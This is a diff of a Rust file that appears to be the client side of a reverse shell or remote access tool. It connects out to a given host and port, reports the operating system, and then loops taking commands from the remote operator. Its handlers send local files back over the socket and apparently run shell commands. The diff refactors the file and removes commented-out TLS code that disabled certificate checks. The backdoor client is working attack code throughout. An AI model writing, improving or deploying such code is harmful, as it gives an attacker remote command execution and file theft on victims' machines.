@@ -1,10 +1,8 @@
 use std::error::Error;
 use std::fs::File;
-use std::io::{Read, Write};
-use std::process::{exit, Command};
-
-use native_tls::{TlsConnector, TlsStream};
+use std::io::{BufRead, BufReader, Read, Write};
 use std::net::TcpStream;
+use std::process::{exit, Command};
 
 enum HandlerStatus {
     Ok,
@@ -16,27 +14,10 @@ enum HandlerStatus {
 }
 
 pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
-    let mut clt = TcpStream::connect(i.to_owned() + ":" + p)?;
-    //println!(
-    //    "[+] TCP connection success to the listener at {}",
-    //    clt.peer_addr()?
-    //);
-    //let mut connector_builder = TlsConnector::builder();
-    //connector_builder.danger_accept_invalid_certs(true);
-    //connector_builder.danger_accept_invalid_hostnames(true);
-    //let connector = connector_builder.build()?;
-
-    //let stream = connector.connect("dummy", clt);
-    /*let mut tls_stream = match stream {
-    Ok(s) => s,
-    Err(r) => {
-        println!("TLS handshake error : {}", r);
-        exit(6);
-    }
-    };*/
+    let mut stream = TcpStream::connect(i.to_owned() + ":" + p)?;
 
     let os = std::env::consts::FAMILY;
-    let res = clt.write_all(os.as_bytes());
+    let res = stream.write_all(os.as_bytes());
 
     if res.is_err() {
         println!("Error sending OS info : {}", res.err().unwrap());
@@ -45,7 +26,7 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
 
     loop {
         let mut buff = [0; 4096];
-        let read = clt.read(&mut buff);
+        let read = stream.read(&mut buff);
         let bytes_read = match read {
             Ok(b) => b,
             Err(r) => {
@@ -58,34 +39,25 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
             .trim_end_matches('\0')
             .to_string();
 
-        match handler(cmd, &mut clt) {
+        println!("CMD: {}", cmd);
+
+        match handler(cmd, &mut stream) {
             HandlerStatus::Ok => (),
-            HandlerStatus::MetadataError => {
-                println!("File metadata error");
-                continue;
-            }
-            HandlerStatus::FileError => {
-                println!("File error");
-                continue;
-            }
-            HandlerStatus::CmdError => {
-                println!("Command error");
-                continue;
-            }
+            HandlerStatus::MetadataError => println!("File metadata error"),
+            HandlerStatus::FileError => println!("File error"),
+            HandlerStatus::CmdError => println!("Command error"),
             HandlerStatus::EndSession => {
                 println!("Ending session");
                 break;
             }
             HandlerStatus::SendError => {
                 println!("Error sending data");
-                continue;
+                break;
             }
         }
-
-        clt.flush()?;
+        stream.flush()?;
     }
 
-    //clt.shutdown()?;
     Ok(())
 }
 
@@ -102,22 +74,24 @@ fn handler(cmd: String, tls_stream: &mut TcpStream) -> HandlerStatus {
 fn dl_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
     let path: Vec<&str> = cmd.split(' ').collect();
     match File::open(path[1]) {
-        Ok(mut file) => {
-            let mut file_buffer = [0; 4096];
-            loop {
-                let bytes_read = file.read(&mut file_buffer).expect("failed to read");
-                if bytes_read == 0 {
-                    break;
-                }
-                let status = tls_stream.write_all(&file_buffer[..bytes_read]);
+        Ok(mut file) => match read_file(&mut file) {
+            Ok(vec) => {
+                let status = tls_stream.write_all(&vec);
                 if status.is_err() {
                     return HandlerStatus::SendError;
                 }
+                HandlerStatus::Ok
             }
-            HandlerStatus::Ok
-        }
+            Err(_) => HandlerStatus::FileError,
+        },
         Err(_) => HandlerStatus::FileError,
     }
+}
+
+fn read_file(file: &mut File) -> Result<Vec<u8>, std::io::Error> {
+    let mut reader = BufReader::new(file);
+    let vec = reader.fill_buf()?.to_vec();
+    Ok(vec)
 }
 
 fn run_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
